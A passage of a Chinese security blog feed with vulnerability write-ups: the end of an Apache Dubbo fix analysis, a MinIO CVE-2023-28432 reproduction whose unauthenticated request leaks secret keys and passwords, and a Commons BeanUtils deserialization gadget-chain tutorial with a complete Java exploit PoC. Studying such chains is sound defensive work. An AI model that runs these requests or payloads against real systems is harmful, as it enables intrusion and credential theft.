2.7.x &gt;&#x3D; 2.7.22<br>Apache Dubbo 3.0.x &gt;&#x3D; 3.0.14<br>Apache Dubbo 3.1.x &gt;&#x3D; 3.1.6</p><p><a href="https://github.com/apache/dubbo/releases">https://github.com/apache/dubbo/releases</a></p><p>修复方式：</p><ul><li>主要新增了可序列化类判断，对type进行校验</li></ul><p><img src="/posts/3e6cbad8/d36.png" title="修复方式"></p><p>新增checkSerializable判断和判断该类是否是可序列化的类</p><p><img src="/posts/3e6cbad8/d37.png" title="修复方式"></p><p>其中checkSerializable属性默认为true即开启序列化检查</p><p><img src="/posts/3e6cbad8/d38.png" title="修复方式"></p><p>同时在上文利用提到的方式一用的SerializeClassChecker类来规避黑名单以及方式二使用的ConfigUtils类来修改属性，这两个类都未实现序列化接口，因此都无法通过是否实现序列化的if检查</p><p>使用方式一执行SerializeClassChecker类来规避黑名单直接抛出该类不允许序列化异常</p><p><img src="/posts/3e6cbad8/d39.png" title="抛出异常"></p><p>因此也自然无法使用JDBC链</p><p><img src="/posts/3e6cbad8/d40.png" title="抛出异常"></p><h1 id="0x08、参考链接"><a href="#0x08、参考链接" class="headerlink" title="0x08、参考链接"></a>0x08、参考链接</h1><p><a href="https://nox.qianxin.com/article/540">https://nox.qianxin.com/article/540</a><br><a href="https://github.com/apache/dubbo/commit/4f664f0a3d338673f4b554230345b89c580bccbb">https://github.com/apache/dubbo/commit/4f664f0a3d338673f4b554230345b89c580bccbb</a><br><a href="https://github.com/lz2y/DubboPOC">https://github.com/lz2y/DubboPOC</a><br><a href="https://github.com/X1r0z/CVE-2023-23638">https://github.com/X1r0z/CVE-2023-23638</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MinIO信息泄露(CVE-2023-28432)复现与分析</title>
      <link href="/posts/3e6cbad7.html"/>
      <url>/posts/3e6cbad7.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>MinIO信息泄露(CVE-2023-28432)复现与分析</p><h1 id="0x01、MinIO描述"><a href="#0x01、MinIO描述" class="headerlink" title="0x01、MinIO描述"></a>0x01、MinIO描述</h1><p>MinIO是一个用Golang开发的基于Apache License v2.0开源协议的对象存储服务。</p><h1 id="0x02、漏洞描述"><a href="#0x02、漏洞描述" class="headerlink" title="0x02、漏洞描述"></a>0x02、漏洞描述</h1><p>MinIO 存在信息泄露漏洞，在集群部署的MinIO中，未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，最终可能导致攻击者以管理员身份登录MinIO。</p><h1 id="0x03、漏洞范围"><a href="#0x03、漏洞范围" class="headerlink" title="0x03、漏洞范围"></a>0x03、漏洞范围</h1><p>RELEASE.2019-12-17T23-16-33Z &lt;&#x3D; MinIO &lt; RELEASE.2023-03-20T20-16-18Z<br>(注：漏洞存在于分布式集群配置情况下的MinIO组件，独立MinIO不受影响)</p><h1 id="0x04、复现"><a href="#0x04、复现" class="headerlink" title="0x04、复现"></a>0x04、复现</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /minio/bootstrap/v1/verify</span><br><span class="line">host: ip</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>实测中不加”Content-Type”字段也能返回数据</p><p><img src="/posts/3e6cbad7/m1.png" title="漏洞复现"></p><h1 id="0x05、分析"><a href="#0x05、分析" class="headerlink" title="0x05、分析"></a>0x05、分析</h1><p>根据官方修复代码段进行简述分析<br>问题出在cmd&#x2F;bootstrap-peer-server.go文件<br>声明的bootstrap相关常量信息</p><p><img src="/posts/3e6cbad7/m2.png" title="bootstrap相关常量"></p><p>入口在调用该文件的<code>registerBootstrapRESTHandlers</code>方法</p><p><img src="/posts/3e6cbad7/m3.png" title="registerBootstrapRESTHandlers"></p><p>其中server是bootstrapRESTServer属性</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">server := &amp;bootstrapRESTServer&#123;&#125;</span><br></pre></td></tr></table></figure><p>然后的subrouter是路由前缀，指向地址bootstrapRESTPrefix也就是上面常量（minioReservedBucketPath + “&#x2F;bootstrap”）即路径：minio&#x2F;bootstrap</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">subrouter := router.PathPrefix(bootstrapRESTPrefix).Subrouter()</span><br></pre></td></tr></table></figure><p>最后调用，方法类型为post，路径（bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify）即上面的常量组合起来的路径（v1&#x2F;verify）,然后调用VerifyHandler</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify).HandlerFunc(</span><br><span class="line">httpTraceHdrs(server.VerifyHandler))</span><br></pre></td></tr></table></figure><p><img src="/posts/3e6cbad7/m4.png" title="VerifyHandler"></p><p>其中ctx为获取的包含请求、响应和其他的上下文信息</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ctx := newContext(r, w, <span class="string">&quot;VerifyHandler&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后获取系统配置信息</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">cfg := getServerSystemCfg()</span><br></pre></td></tr></table></figure><p>这里获取环境变量列表中前缀为”MINIO_”的数据，但遇到skipEnvs[]数组中的变量名则跳过</p><p><img src="/posts/3e6cbad7/m5.png" title="getServerSystemCfg"></p><p>也就是图中红色区域的环境变量名字，将不存储在列表中（目的是这些变量的值内容不会输出出来，因此更新后加了绿色区域的一些环境变量，也让其不输出）</p><p><img src="/posts/3e6cbad7/m6.png" title="getServerSystemCfg"></p><p>获取后系统配置信息，调用logger.LogIf方法，其中会将ctx获取的上下文请求进行写入http响应体中，响应内容则为cfg即系统配置变量的值内容</p><p><img src="/posts/3e6cbad7/m7.png" title="getServerSystemCfg"></p><p>因此在POST请求&#x2F;minio&#x2F;bootstrap&#x2F;v1&#x2F;verify路径时，会返回系统配置信息</p><p><img src="/posts/3e6cbad7/m1.png" title="写入HTTP响应体"></p><p>其中不包括下列跳过的配置内容</p><p><img src="/posts/3e6cbad7/m8.png" title="getServerSystemCfg"></p><p>至此结束，实际就是接口的未授权访问，返回了系统配置信息</p><h1 id="0x06、修复"><a href="#0x06、修复" class="headerlink" title="0x06、修复"></a>0x06、修复</h1><p>目前官方已发布安全修复版本，受影响用户可以升级到RELEASE.2023-03-20T20-16-18Z及以上版本。</p><p><a href="https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z">https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z</a></p><p>修复方式：</p><ul><li>添加了请求方法storageServerRequestValidate（）进行请求黑名单匹配，匹配到则将错误写入响应日志并返回，不会进入logger.LogIf方法中写入http响应的阶段。</li></ul><p><img src="/posts/3e6cbad7/m9.png" title="getServerSystemCfg"></p><ul><li>添加环境变量过滤，将更多的敏感系统配置信息进行跳过不显示</li></ul><p><img src="/posts/3e6cbad7/m10.png" title="getServerSystemCfg"></p><h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a href="https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q">https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</a><br><a href="https://mp.weixin.qq.com/s/0rOObnlqoJY7KJSRnhNJuA">https://mp.weixin.qq.com/s/0rOObnlqoJY7KJSRnhNJuA</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CB1&amp;CB2无依赖CC链学习与分析</title>
      <link href="/posts/638f8ee9.html"/>
      <url>/posts/638f8ee9.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>到Commons BeanUtils组件利用链分析，主要是CB1链以及CB1链无依赖CC组件形成的CB2链的分析</p><h1 id="0x01、CommonsBeanutils描述"><a href="#0x01、CommonsBeanutils描述" class="headerlink" title="0x01、CommonsBeanutils描述"></a>0x01、CommonsBeanutils描述</h1><p>Apache Commons BeanUtils 是一个 Java 库，作为更大的 Apache Commons 项目的一部分。它提供了一组实用方法和类，用于操作 Java Bean。Java Bean 是一种遵循特定命名约定的 Java 类，具有一组属性和访问它们的 getter 和 setter 方法。</p><p>Commons BeanUtils 主要功能包括：</p><pre><code>动态操作 Java Bean 属性：通过使用 Java 反射和内省机制，BeanUtils 允许你在运行时动态地访问和修改 Java Bean 的属性。数据类型转换：BeanUtils 提供了一组用于在各种数据类型之间进行转换的实用方法，例如将字符串转换为整数、浮点数等。自动填充 Java Bean：通过将一个对象的属性值复制到另一个对象，BeanUtils 可以用于自动填充 Java Bean，从而简化了数据传输对象 (DTO) 和领域模型之间的转换工作。动态创建 Java Bean 实例：BeanUtils 提供了实例化类的方法，而无需显式地调用构造函数。支持嵌套属性：BeanUtils 支持访问嵌套属性，这意味着你可以访问和操作一个 Bean 中的另一个 Bean 的属性。</code></pre><p>Commons BeanUtils 库在许多 Java 应用程序和框架中广泛使用，例如 Apache Struts 和 Spring Framework。它可以简化代码，提高开发效率，并有助于降低维护成本。</p><h1 id="0x02、前置知识"><a href="#0x02、前置知识" class="headerlink" title="0x02、前置知识"></a>0x02、前置知识</h1><h2 id="templates、PriorityQueue"><a href="#templates、PriorityQueue" class="headerlink" title="templates、PriorityQueue"></a>templates、PriorityQueue</h2><p>templates字节码、PriorityQueue优先级队列的相关知识在cc2中写过了，回顾<a href="https://okaytc.github.io/posts/7e30cd4a.html">cc2</a></p><h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h2><p>CommonsBeanutils组件的类</p><p>官方定义的作用：此比较器通过指定的bean属性比较两个bean。还可以基于嵌套的、索引的、组合的、映射的bean属性来比较bean。</p><p>也就是Bean的比较器，其中Bean理解为通过<code>getter/setter</code>方式获取和赋值成员变量的类。</p><p>主要作用是通过<code>property</code>字段属性来比较bean方法中返回属性，其中会通过<code>getter/setter</code>来获取<code>property</code>属性对应的<code>get/set</code>前缀的方法，并通过反射执行</p><p><img src="/posts/638f8ee9/c1-3.png" title="获取属性"></p><p>获取<code>bean property</code>属性后，在进行<code>compare</code>比较。</p><h1 id="0x03、CB1分析"><a href="#0x03、CB1分析" class="headerlink" title="0x03、CB1分析"></a>0x03、CB1分析</h1><p>CB1核心就是使用CC2链，改变了触发入口点，将比较器改为了BeanComparator</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p>commons-beanutils&#x3D;1.9.2<br>commons-collections&lt;&#x3D;3.2.1</p><h2 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/638f8ee9/c1-25.png" title="环境版本"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>核心通过<code>templates</code>加载字节码，然后设置<code>property</code>属性，通过<code>BeanComparator</code>比较器的<code>getter/setter</code>读取<code>property</code>属性并反射执行。</p><p>我这里是已经构造好POC执行，然后分析的流程，先分析过程，再最后构造POC。</p><p>跟进<code>BeanComparator</code>比较器，存在<code>property</code>、<code>comparator</code>两个成员属性，分别代表’用于比较方法的属性名’、’比较器’</p><p><img src="/posts/638f8ee9/c1-4.png" title="BeanComparator成员属性"></p><p>跟进<code>compare</code>方法，先是判断<code>property</code>属性是否存在，不存在就直接比较两个对象（这里传入的比较对象包括了<code>templates</code>对象）</p><p><img src="/posts/638f8ee9/c1-5.png" title="compare"></p><p><code>property</code>属性存在，则通过<code>getProperty</code>方法<code>getter/setter</code>获取对象<code>property</code>真实属性</p><p><img src="/posts/638f8ee9/c1-6.png" title="getProperty"></p><p>继续跟进<code>getProperty</code>查看流程，调用<code>PropertyUtilsBean.getProperty</code>,继续跟进</p><p><img src="/posts/638f8ee9/c1-7.png" title="PropertyUtilsBean.getProperty"></p><p>接着调用<code>getNestedProperty</code>进入获取嵌套<code>Property</code>属性方法</p><p><img src="/posts/638f8ee9/c1-8.png" title="getNestedProperty"></p><p>由于传入的<code>Property</code>属性为普通的属性，不属于嵌套形式，因此会跳出while循环获取嵌套内容</p><p><img src="/posts/638f8ee9/c1-9.png" title="getNestedProperty"></p><p>然后判断<code>bean</code>的属性，由于<code>bean</code>(<code>templates</code>类对象)不属于<code>map</code>，并且<code>name</code>（<code>Property</code>属性）也不属于<code>map</code>和<code>index</code>类型，最后调用<code>getSimpleProperty</code>方法获取真实属性</p><p><img src="/posts/638f8ee9/c1-10.png" title="getSimpleProperty"></p><p>跟进<code>getSimpleProperty</code>，又是同一个判断步骤，继续往下</p><p><img src="/posts/638f8ee9/c1-11.png" title="getSimpleProperty"></p><p>多了个判断判断是否是动态bean类型，不属于，进入下一个代码段</p><p><img src="/posts/638f8ee9/c1-12.png" title="DynaBean"></p><p>通过<code>getPropertyDescriptor</code>方法获取真实属性<code>Property</code></p><p><img src="/posts/638f8ee9/c1-13.png" title="getPropertyDescriptor"></p><p>跟进<code>getPropertyDescriptor</code>方法，开头又是同一个判断，直接到下面代码段</p><p><img src="/posts/638f8ee9/c1-14.png" title="getPropertyDescriptor"></p><p>通过<code>getDescriptor</code>方法<code>getter/setter</code>获取<code>name</code>在对象中的真实属性</p><p><img src="/posts/638f8ee9/c1-15.png" title="getDescriptor"><br><img src="/posts/638f8ee9/c1-16.png" title="getDescriptor"><br><img src="/posts/638f8ee9/c1-17.png" title="getDescriptor"></p><p>读取到真实方法名过后进行对对象进行方法反射调用</p><p><img src="/posts/638f8ee9/c1-18.png" title="invokeMethod"><br><img src="/posts/638f8ee9/c1-19.png" title="invokeMethod"></p><p>执行<code>templates</code>的<code>getOutputProperties</code>方法触发漏洞</p><p><img src="/posts/638f8ee9/c1-20.png" title="触发漏洞"></p><p>剩下的就是如何将<code>templates</code>对象传入<code>BeanComparator</code>构造器的步骤了，这里就是CC2后半段的一部分，在构造POC中简述</p><p>简述下触发流程：<br>需要构造<code>property</code>属性为<code>getOutputProperties/newTransformer()</code>方法，然后将<code>templates</code>对象传入<code>compare</code>方法作为对象进行比较，然后<code>BeanComparator</code>构造器通过<code>getter/setter</code>获取对象的真实<code>property</code>属性再进行反射执行触发漏洞</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>首先cc2中的<code>templates</code>字节码构造没变化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br></pre></td></tr></table></figure><p>然后调用<code>BeanComparator</code>构造器，并且通过反射将<code>BeanComparator</code>构造器的<code>property</code>属性设置为<code>getOutputProperties/newTransformer()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>接着就是cc2后半段，利用<code>PriorityQueue</code>优先级队列将<code>BeanComparator</code>构造器作为比较器，来调用<code>BeanComparator.compare</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置优先级队列对象</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置比较器</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,beanComparator);</span><br><span class="line"><span class="comment">//设置传递的队列元素，需要将templates对象传入</span></span><br><span class="line">Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br></pre></td></tr></table></figure><p>原理：<br>PriorityQueue重写了反序列化步骤,调用<code>heapify()</code>;</p><p><img src="/posts/638f8ee9/c1-21.png" title="readObject"></p><p>条件要求size大于2(详情查看cc2后半段分析)，才能调用<code>siftDown</code>方法</p><p><img src="/posts/638f8ee9/c1-22.png" title="siftDown"></p><p>接着调用<code>siftDownUsingComparator</code>方法</p><p><img src="/posts/638f8ee9/c1-23.png" title="siftDownUsingComparator"></p><p>这里会调用<code>comparator.compare</code>方法，通过反射<code>setFieldValue(pq,&quot;comparator&quot;,beanComparator);</code>设置了比较器，因此会调用到<code>beanComparator.compare</code>方法进入上述分析的步骤</p><p><img src="/posts/638f8ee9/c1-24.png" title="comparator.compare"></p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><p>最后加上反序列化步骤就构成了完整的poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="comment">//设置getOutputProperties/newTransformer均可</span></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,beanComparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素，需要将templates对象传入</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cb1payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cb1payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04、CB2分析"><a href="#0x04、CB2分析" class="headerlink" title="0x04、CB2分析"></a>0x04、CB2分析</h1><h2 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h2><p>commons-beanutils&#x3D;1.9.2<br>commons-beanutils&#x3D;1.8.3</p><h2 id="利用环境-1"><a href="#利用环境-1" class="headerlink" title="利用环境"></a>利用环境</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="CB1依赖问题"><a href="#CB1依赖问题" class="headerlink" title="CB1依赖问题"></a>CB1依赖问题</h2><p>在CB1中，调用的BeanComparator类，是直接进行声明对象调用的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br></pre></td></tr></table></figure><p>该调用方式直接调用<code>BeanComparator</code>的无参构造方式，无参构造方式又会传递个null值去调用带一个参数的构造方法，该方法又会调用<code>ComparableComparator.getInstance()</code>方法去调用<code>public BeanComparator( String property, Comparator&lt;?&gt; comparator )</code>的构造方法</p><p><img src="/posts/638f8ee9/c1-26.png" title="BeanComparator"></p><p>其中调用<code>ComparableComparator.getInstance()</code>，调用的<code>ComparableComparator</code>类为<code>commons-collections</code>组件的类，意味着CB1链是依赖于CC组件的，如果目标环境不存在CC组件那么就无法使用CB1链</p><p><img src="/posts/638f8ee9/c1-27.png" title="ComparableComparator"></p><p>因此CB2链的核心变动就是<code>BeanComparator</code>类的声明方式，规避使用到<code>ComparableComparator</code>类作为<code>comparator</code>比较器，因此只需要替换一下<code>comparator</code>比较器，找一个java自带或者cb组件自带的实现了<code>comparator</code>和序列化的比较器类即可</p><p><img src="/posts/638f8ee9/c1-28.png" title="ComparableComparator"></p><h2 id="CB2分析"><a href="#CB2分析" class="headerlink" title="CB2分析"></a>CB2分析</h2><p>示例<code>AttrCompare</code>类，实现了<code>comparator</code>和序列化</p><p><img src="/posts/638f8ee9/c1-29.png" title="AttrCompare"></p><p>同时不用关注该类下面的调用方法，因为<code>BeanComparator</code>类的触发为<code>BeanComparator.compare</code>方法中<code>getter/setter</code>获取对象方法进行反射调用</p><p>因此只需要将上面的代码<code>BeanComparator</code>类的声明方式换成</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br></pre></td></tr></table></figure><p>其他条件不用变化，跟进查看执行，这里调用<code>BeanComparator</code>类会直接调用<code>BeanComparator( String property, Comparator&lt;?&gt; comparator )</code>的构造方法，赋值<code>comparator</code>后直接跳过了调用<code>ComparableComparator.getInstance()</code>的步骤</p><p><img src="/posts/638f8ee9/c1-30.png" title="AttrCompare"></p><p>再到调用compare方法</p><p><img src="/posts/638f8ee9/c1-31.png" title="compare"></p><p>后面在CB1分析过了，同样的步骤，通过<code>getter/setter</code>获取对象方法，再通过反射调用执行该方法触发漏洞</p><p><img 